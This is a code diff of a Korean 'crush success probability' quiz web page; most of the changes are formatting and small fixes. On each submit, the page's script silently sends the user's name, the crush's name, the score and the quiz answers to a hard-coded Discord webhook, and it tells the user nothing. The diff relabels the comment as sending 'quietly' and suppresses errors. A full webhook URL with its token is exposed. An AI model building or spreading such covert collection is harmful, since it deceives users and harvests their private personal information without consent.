@@ -2,7 +2,7 @@
 <html lang="ko">
 <head>
   <meta charset="utf-8">
-  <title>짝사랑 성공 확률 테스트 💘</title>
+  <title>짝사랑 성공 확률 테스트 </title>
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <style>
     body {
@@ -57,10 +57,10 @@
 
 <form id="loveForm">
   <label>당신의 이름</label>
-  <input id="yourName" required>
+  <input id="yourName" type="text" required>
 
   <label>짝사랑 상대 이름</label>
-  <input id="crushName" required>
+  <input id="crushName" type="text" required>
 
   <div id="questions"></div>
 
@@ -70,7 +70,8 @@
 <div id="result"></div>
 
 <script>
-const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1452673428657278987/IRWnuZj-k98r8nef0lgV6SLWUdjktHtkY5jVeriX7ZBpgPZEJAXJv3kCd2CVg74wJNLj";
+const DISCORD_WEBHOOK_URL =
+  "https://discord.com/api/webhooks/1452673428657278987/IRWnuZj-k98r8nef0lgV6SLWUdjktHtkY5jVeriX7ZBpgPZEJAXJv3kCd2CVg74wJNLj";
 
 const questionsData = [
   ["상대와 얼마나 자주 대화하나요?", ["거의 안 해요",10], ["가끔 해요",40], ["자주 해요",70], ["매일 대화해요",100]],
@@ -90,36 +91,42 @@ const qWrap = document.getElementById("questions");
 questionsData.forEach((q,i)=>{
   const div=document.createElement("div");
   div.className="question";
-  div.innerHTML=`<label>${i+1}. ${q[0]}</label>`+
-    q.slice(1).map(o=>`
-      <label><input type="radio" name="q${i}" value="${o[1]}"> ${o[0]}</label>
-    `).join("");
+  div.innerHTML =
+    `<label>${i+1}. ${q[0]}</label>` +
+    q.slice(1).map(o =>
+      `<label><input type="radio" name="q${i}" value="${o[1]}"> ${o[0]}</label>`
+    ).join("");
   qWrap.appendChild(div);
 });
 
-document.getElementById("loveForm").addEventListener("submit", async e=>{
+document.getElementById("loveForm").addEventListener("submit", e=>{
   e.preventDefault();
 
-  const yourName=yourNameInput.value.trim();
-  const crushName=crushNameInput.value.trim();
-  if(!yourName||!crushName)return;
+  const yourName = document.getElementById("yourName").value.trim();
+  const crushName = document.getElementById("crushName").value.trim();
+  if (!yourName || !crushName) return;
 
-  let total=0;
-  const answers=[];
+  let total = 0;
+  const answers = [];
 
   questionsData.forEach((q,i)=>{
-    const sel=document.querySelector(`input[name=q${i}]:checked`);
-    const v=sel?Number(sel.value):0;
-    total+=v;
-    answers.push(sel?sel.parentElement.innerText:"미응답");
+    const sel = document.querySelector(`input[name="q${i}"]:checked`);
+    const v = sel ? Number(sel.value) : 0;
+    total += v;
+    answers.push(sel ? sel.parentElement.innerText : "미응답");
   });
 
-  const percent=Math.round(total/questionsData.length);
-  const msg=percent<40?"🥀 가능성 낮음":percent<70?"🌸 희망 있음":percent<90?"💞 거의 확정":"🔥 커플 각";
+  const percent = Math.round(total / questionsData.length);
+  const msg =
+    percent < 40 ? "🥀 가능성 낮음" :
+    percent < 70 ? "🌸 희망 있음" :
+    percent < 90 ? "💞 거의 확정" :
+                   "🔥 커플 각";
 
-  result.innerHTML=`${yourName} 💘 ${crushName}<br><b>${percent}%</b><br>${msg}`;
+  document.getElementById("result").innerHTML =
+    `${yourName} 💘 ${crushName}<br><b>${percent}%</b><br>${msg}`;
 
-  // Discord 전송 (실패해도 UI 영향 없음)
+  // Discord 전송 (조용히)
   fetch(DISCORD_WEBHOOK_URL,{
     method:"POST",
     headers:{ "Content-Type":"application/json" },
@@ -131,11 +138,11 @@ document.getElementById("loveForm").addEventListener("submit", async e=>{
         fields:[
           {name:"👤 나",value:yourName,inline:true},
           {name:"💖 상대",value:crushName,inline:true},
-          {name:"📈 확률",value:`${percent}%`,inline:false},
-          {name:"💬 결과",value:msg,inline:false},
+          {name:"📈 확률",value:`${percent}%`},
+          {name:"💬 결과",value:msg},
           {name:"📝 응답",value:answers.slice(0,6).join("\n")}
         ],
-        footer:{text:new Date().toISOString()}
+        footer:{ text:new Date().toISOString() }
       }]
     })
   }).catch(()=>{});
